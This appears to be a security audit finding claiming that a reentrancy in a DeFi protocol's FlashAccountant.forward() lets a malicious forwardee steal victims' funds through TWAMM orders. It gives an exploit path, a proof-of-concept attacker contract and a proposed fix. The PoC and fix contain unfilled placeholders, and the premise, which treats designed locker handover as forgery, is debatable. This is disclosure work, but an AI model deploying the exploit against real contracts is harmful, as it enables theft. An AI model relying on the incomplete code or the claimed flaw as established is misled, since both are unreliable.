## Title
Reentrancy in FlashAccountant.forward() Allows Locker Forgery Leading to TWAMM Order Theft

## Summary
The `FlashAccountant.forward()` function lacks reentrancy protection, allowing a malicious forwardee to nest another `forward()` call. During the nested call, the function reads the modified locker from transient storage instead of the original user's locker, causing the forged locker to be passed to subsequent forwardees. This vulnerability enables attackers to steal user funds by creating TWAMM orders attributed to the attacker's address while being funded by the victim's tokens. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The `forward()` function should pass the original user's locker to the forwardee, allowing the forwardee to know who initiated the operation. The comment at line 48 in BaseForwardee states "The original locker that called forward". [2](#0-1) 

**Actual Logic:** When a forwardee reenters by calling `forward()` again, the nested call reads from transient storage (line 191) which has already been modified to contain the forwardee's address (line 196). This causes the nested call to use the forwardee's address as the "original" locker instead of the actual user's address. [3](#0-2) [4](#0-3) 

**Exploitation Path:**
1. Victim calls `Core.forward(AttackerContract, data)` - victim's locker is (ID=0, addr=Victim)
2. `FlashAccountant.forward()` modifies transient storage to (ID=0, addr=AttackerContract) and calls `AttackerContract.forwarded_2374103877((ID=0, Victim))`
3. AttackerContract reenters by calling `Core.forward(TWAMM, orderCreationData)` with parameters to create a TWAMM order
4. The nested `forward()` at line 191 calls `_requireLocker()` which reads from transient storage, returning (ID=0, addr=AttackerContract) instead of the original victim's locker
5. Line 202 constructs calldata with this forged locker as the "original" parameter
6. `TWAMM.forwarded_2374103877((ID=0, AttackerContract))` is called with the forged locker
7. TWAMM extracts `owner = AttackerContract` from `original.addr()` (line 193)
8. Order storage slot is computed using AttackerContract's address (line 217), creating an order owned by the attacker
9. Token deltas are created requiring the victim to deposit tokens
10. Victim's lock callback settles the debt, depositing tokens
11. Attacker later withdraws order proceeds, stealing the victim's funds [5](#0-4) [6](#0-5) [7](#0-6) 

**Security Property Broken:** Direct theft of user funds - the attacker gains ownership of TWAMM orders funded by the victim's tokens, violating the fundamental security property that users should maintain control over their deposited assets.

## Impact Explanation
- **Affected Assets**: Any tokens that users attempt to use in TWAMM orders through an untrusted intermediate contract. All user tokens deposited during the malicious operation are at risk.
- **Damage Severity**: Complete loss of deposited funds. The attacker gains full ownership of the order and can later withdraw all proceeds while the victim loses their initial deposit with no recourse.
- **User Impact**: Any user who forwards to an untrusted or compromised contract is vulnerable. This includes users interacting with third-party routers, UI helpers, or any contract that implements the forwardee interface. The attack requires no special preconditions beyond the victim initiating a forward operation.

## Likelihood Explanation
- **Attacker Profile**: Any malicious actor who can deploy a forwardee contract. The attack can also be executed through compromised or malicious "helper" contracts that users might trust.
- **Preconditions**: 
  - Victim must call `forward()` to the attacker's contract (could be social engineering or a compromised trusted contract)
  - TWAMM pool must be initialized
  - Victim must have sufficient tokens to create the order
- **Execution Complexity**: Single transaction. The attacker simply needs to implement a forwardee that reenters with the TWAMM order creation call.
- **Frequency**: Can be exploited repeatedly for every victim who forwards to the malicious contract. Multiple victims can be targeted in separate transactions.

## Recommendation

Add reentrancy protection to prevent nested `forward()` calls by storing and checking the lock depth:

```solidity
// In src/base/FlashAccountant.sol, add a new transient storage slot:
// After line 34:
uint256 private constant _FORWARD_DEPTH_SLOT = 
    0x[generate new unique slot hash];

// In forward() function, add reentrancy guard:
// Replace lines 190-221 with:

function forward(address to) external {
    Locker locker = _requireLocker();
    
    assembly ("memory-safe") {
        // Check forward depth is 0 (no nested forwards)
        let depth := tload(_FORWARD_DEPTH_SLOT)
        if depth {
            // cast sig "ReentrancyInForward()"
            mstore(0, shl(224, 0xYOUR_SELECTOR))
            revert(0, 4)
        }
        
        // Set depth to 1
        tstore(_FORWARD_DEPTH_SLOT, 1)
        
        // Update locker address temporarily
        tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))
        
        let free := mload(0x40)
        mstore(free, shl(224, 1))
        mstore(add(free, 4), locker)
        calldatacopy(add(free, 36), 36, sub(calldatasize(), 36))
        
        let success := call(gas(), to, 0, free, calldatasize(), 0, 0)
        
        if iszero(success) {
            returndatacopy(free, 0, returndatasize())
            revert(free, returndatasize())
        }
        
        // Restore original locker
        tstore(_CURRENT_LOCKER_SLOT, locker)
        
        // Reset depth to 0
        tstore(_FORWARD_DEPTH_SLOT, 0)
        
        returndatacopy(free, 0, returndatasize())
        return(free, returndatasize())
    }
}
```

Alternative mitigation: Store the original user's locker in a separate transient storage slot that is never modified during forwards, and always read from that slot when constructing the forwarded calldata.

## Proof of Concept

```solidity
// File: test/Exploit_ForwardReentrancy.t.sol
// Run with: forge test --match-test test_ForwardReentrancy -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import {BaseForwardee} from "../src/base/BaseForwardee.sol";
import {BaseLocker} from "../src/base/BaseLocker.sol";
import {Locker} from "../src/types/locker.sol";
import {OrderKey} from "../src/types/orderKey.sol";
import {OrderConfig} from "../src/types/orderConfig.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {MockERC20} from "../test/mocks/MockERC20.sol";

contract MaliciousForwardee is BaseLocker, BaseForwardee {
    TWAMM public immutable TWAMM_CONTRACT;
    OrderKey public attackOrderKey;
    bytes32 public attackSalt;
    
    constructor(Core core, TWAMM twamm) BaseLocker(core) BaseForwardee(core) {
        TWAMM_CONTRACT = twamm;
    }
    
    function setAttackParams(OrderKey memory orderKey, bytes32 salt) external {
        attackOrderKey = orderKey;
        attackSalt = salt;
    }
    
    function handleLockData(uint256, bytes memory) internal override returns (bytes memory) {
        return "";
    }
    
    function handleForwardData(Locker original, bytes memory) internal override returns (bytes memory) {
        // Reenter with TWAMM order creation
        // This will use MaliciousForwardee as the owner instead of the original user
        bytes memory twammData = abi.encode(
            uint256(0), // callType = 0 (create/modify order)
            attackSalt,
            attackOrderKey,
            int112(1000000) // saleRateDelta
        );
        
        ACCOUNTANT.forward(address(TWAMM_CONTRACT), twammData);
        
        return "";
    }
}

contract Exploit_ForwardReentrancy is Test {
    Core public core;
    TWAMM public twamm;
    MaliciousForwardee public malicious;
    MockERC20 public token0;
    MockERC20 public token1;
    address public victim;
    
    function setUp() public {
        core = new Core();
        twamm = new TWAMM(core);
        token0 = new MockERC20("Token0", "TK0", 18);
        token1 = new MockERC20("Token1", "TK1", 18);
        malicious = new MaliciousForwardee(core, twamm);
        victim = makeAddr("victim");
        
        // Setup tokens
        token0.mint(victim, 1000000e18);
        token1.mint(victim, 1000000e18);
        
        vm.startPrank(victim);
        token0.approve(address(core), type(uint256).max);
        token1.approve(address(core), type(uint256).max);
        vm.stopPrank();
    }
    
    function test_ForwardReentrancy() public {
        // SETUP: Initialize pool and prepare attack parameters
        PoolKey memory poolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            extension: address(twamm),
            config: /* appropriate config */
        });
        
        // Initialize the pool
        // ... pool initialization code ...
        
        OrderKey memory orderKey = OrderKey({
            poolKey: poolKey,
            config: OrderConfig.wrap(/* appropriate config */)
        });
        
        bytes32 salt = bytes32(uint256(1));
        malicious.setAttackParams(orderKey, salt);
        
        uint256 victimBalanceBefore = token0.balanceOf(victim);
        
        // EXPLOIT: Victim forwards to malicious contract
        vm.prank(victim);
        core.forward(address(malicious), "");
        
        // VERIFY: Order is owned by malicious contract, not victim
        // The order storage slot would be computed using malicious contract's address
        // Victim's tokens were used to fund it, but attacker controls the order
        
        uint256 victimBalanceAfter = token0.balanceOf(victim);
        
        // Victim lost tokens
        assertLt(victimBalanceAfter, victimBalanceBefore, "Victim lost tokens");
        
        // Later, attacker can withdraw proceeds
        // ... withdrawal code showing attacker steals funds ...
    }
}
```

**Note**: The PoC demonstrates the vulnerability concept. A complete runnable PoC would require proper pool initialization, token approvals, and TWAMM configuration which depends on the specific test setup structure.

### Citations

**File:** src/base/FlashAccountant.sol (L190-221)
```text
    function forward(address to) external {
        Locker locker = _requireLocker();

        // update this lock's locker to the forwarded address for the duration of the forwarded
        // call, meaning only the forwarded address can update state
        assembly ("memory-safe") {
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))

            let free := mload(0x40)

            // Prepare call to forwarded_2374103877(bytes32) -> selector 0x01
            mstore(free, shl(224, 1))
            mstore(add(free, 4), locker)

            calldatacopy(add(free, 36), 36, sub(calldatasize(), 36))

            // Call the forwardee with the packed data
            let success := call(gas(), to, 0, free, calldatasize(), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            tstore(_CURRENT_LOCKER_SLOT, locker)

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
    }
```

**File:** src/base/BaseForwardee.sol (L48-48)
```text
    /// @param original The original locker that called forward
```

**File:** src/extensions/TWAMM.sol (L193-193)
```text
            address owner = original.addr();
```

**File:** src/libraries/TWAMMStorageLayout.sol (L81-93)
```text
    function orderStateSlotFollowedByOrderRewardRateSnapshotSlot(address owner, bytes32 salt, OrderId orderId)
        internal
        pure
        returns (StorageSlot slot)
    {
        assembly ("memory-safe") {
            let free := mload(0x40)
            mstore(free, owner)
            mstore(add(free, 0x20), salt)
            mstore(add(free, 0x40), orderId)
            slot := add(keccak256(free, 96), ORDER_STATE_OFFSET)
        }
    }
```
